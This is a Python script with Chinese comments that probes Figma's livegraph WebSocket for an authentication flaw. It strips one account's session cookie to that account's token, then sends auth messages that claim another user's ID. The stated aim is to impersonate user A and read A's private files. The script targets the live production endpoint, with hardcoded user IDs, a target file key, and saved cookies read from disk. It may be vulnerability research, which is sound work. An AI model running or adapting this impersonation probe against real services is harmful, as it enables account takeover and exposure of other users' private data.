# -*- coding: utf-8 -*-
"""纯净 B cookie + auth userId 伪造: livegraph 身份语义验证 (核心)
利用目标: 若 auth userId 可伪造且服务端只按 cookie 校验, 纯净 B 声明 A → authSuccess?
  若 authSuccess=A 且能读 A 私有文件数据 → B 可伪装 A (严重)
对照: 纯净 B + userId=B (正常) / 纯净 A + userId=A
"""
import sys, json, asyncio, io, uuid, urllib.parse
import websockets
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

A_UID = "1666382703778278399"
B_UID = "1667396392129259941"
TARGET = "5Gs4PaTz11Hlk2sqVnidBG"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"

def make_pure(cookie, keep_uid):
    parts = {}
    for p in cookie.split('; '):
        if '=' in p:
            k, v = p.split('=', 1)
            parts[k] = v
    authn_raw = parts.get('__Host-figma.authn', '')
    authn = json.loads(urllib.parse.unquote(authn_raw))
    authn = {k: v for k, v in authn.items() if k == keep_uid}
    parts['__Host-figma.authn'] = urllib.parse.quote(json.dumps(authn, separators=(',', ':')))
    return '; '.join(f'{k}={v}' for k, v in parts.items())

rawB = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip().replace('\n', '; ')
rawA = io.open('ws_cookie_A_new.txt', encoding='utf-8').read().strip().replace('\n', '; ')
PURE_B = make_pure(rawB, B_UID)
PURE_A = make_pure(rawA, A_UID)
print('PURE_B 含B token:', B_UID in PURE_B, '含A token:', A_UID in PURE_B)
print('PURE_A 含A token:', A_UID in PURE_A)

def lg_url(uid):
    return (f"wss://www.figma.com/api/livegraph?pv=1&pr=251c5be83e6853e5&pt=1786072093"
            f"&ph=sb9dUg8LQV0WGY29b-j8nggmhGX8TR2vghWs-rNzbds&userId={uid}&anonUserId="
            f"&clientType=web&commitHash=5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"
            f"&preload=%7B%7D&requestedProtocolVersion=2"
            f"&clientUrl=https%3A%2F%2Fwww.figma.com%2Ffile%2F{TARGET}"
            f"&connectionType=initial&reconnect=0")

def auth(uid):
    return {"messageType": "auth", "clientType": "web",
            "args": {"userId": uid, "anonymousUserId": None},
            "tags": {"clientType": "web", "commitHash": "81855c2bc7c604648169c4e4333f43579bfa7464",
                     "clientUrl": f"https://www.figma.com/file/{TARGET}"},
            "clientRequestedVersion": 2}

async def probe(label, cookie, claim_uid):
    try:
        async with websockets.connect(lg_url(claim_uid),
                                      additional_headers={"User-Agent": UA, "Cookie": cookie,
                                                          "Origin": "https://www.figma.com"},
                                      max_size=50_000_000, open_timeout=15) as ws:
            await ws.send(json.dumps(auth(claim_uid)))
            got = None
            for _ in range(3):
                msg = await asyncio.wait_for(ws.recv(), timeout=8)
                if isinstance(msg, str):
                    if "authSuccess" in msg:
                        got = json.loads(msg)
                        break
                    if "authError" in msg or "error" in msg.lower() and "auth" in msg:
                        got = json.loads(msg)
                        break
            if got:
                print(f"[{label}] auth 响应: userId={got.get('userId')} keys={list(got.keys())}")
                if got.get('userId') == A_UID and 'B' in label and '纯' in label:
                    print(f"    ⚠️ 纯净B声明A成功!")
            else:
                print(f"[{label}] 无 auth 响应")
    except Exception as e:
        print(f"[{label}] ❌ {type(e).__name__}: {str(e)[:90]}")

async def main():
    print("\n===== 1. 纯净B + claim B (基线) =====")
    await probe("纯净B claimB", PURE_B, B_UID)
    print("\n===== 2. 纯净B + claim A (核心!) =====")
    await probe("纯净B claimA", PURE_B, A_UID)
    print("\n===== 3. 纯净A + claim A (对照) =====")
    await probe("纯净A claimA", PURE_A, A_UID)
    print("\n===== 4. 纯净A + claim B (反向) =====")
    await probe("纯净A claimB", PURE_A, B_UID)
    print("\n===== 5. 匿名 + claim A =====")
    await probe("匿名 claimA", "", A_UID)

asyncio.run(main())
